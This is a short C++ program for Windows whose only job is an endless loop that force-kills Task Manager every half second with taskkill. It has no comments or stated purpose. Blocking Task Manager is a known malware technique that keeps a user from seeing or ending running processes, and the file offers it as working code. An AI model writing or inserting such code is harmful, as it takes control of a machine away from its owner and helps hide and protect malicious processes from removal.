#include <windows.h>
#include <iostream>
#include <strsafe.h>

using namespace std;

int main() {
    while (true) {
        system("taskkill /F /IM Taskmgr.exe /T");
        Sleep(500);
    }

}